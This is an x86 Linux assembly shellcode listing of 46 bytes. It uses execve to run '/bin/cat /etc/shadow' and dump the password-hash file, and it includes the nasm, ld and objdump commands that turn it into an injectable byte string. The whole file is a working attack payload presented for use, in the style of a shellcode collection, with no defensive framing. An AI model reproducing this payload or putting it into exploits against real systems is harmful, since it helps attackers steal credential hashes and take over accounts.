; execve x86 /bin/cat /etc/shadow - 46 bytes   by 0bfxgh0st*
;
; nasm -f elf execve_x86_cat_etc_shadow.asm
; ld -o execve_x86_cat_etc_shadow execve_x86_cat_etc_shadow.o -m elf_i386
; objdump -d execve_x86_cat_etc_shadow |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
section .text

global _start

_start:

xor eax,eax
xor ecx,ecx
xor edx,edx

push eax
push 0x7461632f    ; tac/
push 0x6e69622f    ; nib/
mov ebx,esp

push eax
push 0x776f6461    ; woda
push 0x68732f63    ; hs/c
push 0x74652f2f    ; te//
mov esi,esp

push eax
push esi
push ebx
mov ecx,esp

mov al,11
int 0x80

